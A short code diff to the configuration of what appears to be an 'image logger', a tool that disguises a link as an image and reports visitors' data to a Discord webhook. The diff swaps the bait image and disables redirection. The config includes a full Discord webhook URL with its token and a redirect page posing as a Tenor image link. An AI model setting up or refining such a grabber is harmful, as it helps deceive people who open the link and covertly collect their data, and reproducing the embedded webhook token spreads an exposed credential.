@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1334743346480156764/55HaIgR2zpDARqf7jyjn0C4gISIRXFa578du3csBWaf9C9gA-slFAtgLIK_BkPSHZ4nZ",
-    "image": "https://i0.wp.com/copyhackers.com/wp-content/uploads/2020/06/91080453_10163333459945083_2233604339354566656_n.jpg?resize=521%2C527&ssl=1", # You can also have a custom image by using a URL argument
+    "image": "https://user-images.githubusercontent.com/14011726/94132137-7d4fc100-fe7c-11ea-8512-69f90cb65e48.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://tenor-fawn.vercel.app/api/image.py" # Link to the webpage to redirect to 
     },
 
